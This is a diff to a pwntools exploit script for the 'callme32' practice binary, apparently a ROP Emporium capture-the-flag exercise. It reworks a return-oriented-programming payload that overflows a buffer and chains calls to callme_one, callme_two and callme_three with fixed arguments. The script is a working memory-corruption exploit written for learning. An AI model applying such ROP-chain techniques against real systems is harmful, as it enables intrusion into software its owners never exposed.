@@ -7,7 +7,9 @@ from pwn import *
 # Set up pwntools for the correct architecture
 context.update(arch="i386")
 context.terminal = ["alacritty", "-e", "sh", "-c"]
+context.terminal = ["wt.exe", "-w", "0", "nt", "wsl.exe", "--"]
 exe = "./callme32"
+rop = ROP(exe)
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -44,38 +46,45 @@ continue
 io = start()
 
 offset = 44
-callme_one = p32(0x080484F0)
-callme_two = p32(0x08048550)
-callme_three = p32(0x080484E0)
-cafebabe = p32(0xCAFEBABE)
-deadbeef = p32(0xDEADBEEF)
-d00df00d = p32(0xD00DF00D)
-pop_gadget = p32(0x080487F8)
-main = p32(0x08048686)
+callme_one = 0x080484F0
+callme_two = 0x08048550
+callme_three = 0x080484E0
+cafebabe = 0xCAFEBABE
+deadbeef = 0xDEADBEEF
+d00df00d = 0xD00DF00D
+pop_gadget = 0x080487F8
+main = 0x08048686
 
-payload = flat(
-    asm("nop") * offset,
-    callme_one,
-    pop_gadget,
-    deadbeef,
-    cafebabe,
-    d00df00d,
-    p32(0x0),
-    callme_two,
-    pop_gadget,
-    deadbeef,
-    cafebabe,
-    d00df00d,
-    p32(0x0),
-    callme_three,
-    pop_gadget,
-    deadbeef,
-    cafebabe,
-    d00df00d,
-    p32(0x0),
-    main,
+pay = flat(
+    {
+        offset: [
+            callme_one,
+            pop_gadget,
+            deadbeef,
+            cafebabe,
+            d00df00d,
+            p32(0x0),
+            callme_two,
+            pop_gadget,
+            deadbeef,
+            cafebabe,
+            d00df00d,
+            p32(0x0),
+            callme_three,
+            pop_gadget,
+            deadbeef,
+            cafebabe,
+            d00df00d,
+            p32(0x0),
+            main,
+        ]
+    }
 )
+rop.call("callme_one", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
+rop.call("callme_two", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
+rop.call("callme_three", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
+# pay = flat({offset: rop.chain()})
 
-io.sendline(payload)
+io.sendline(pay)
 
 io.interactive()
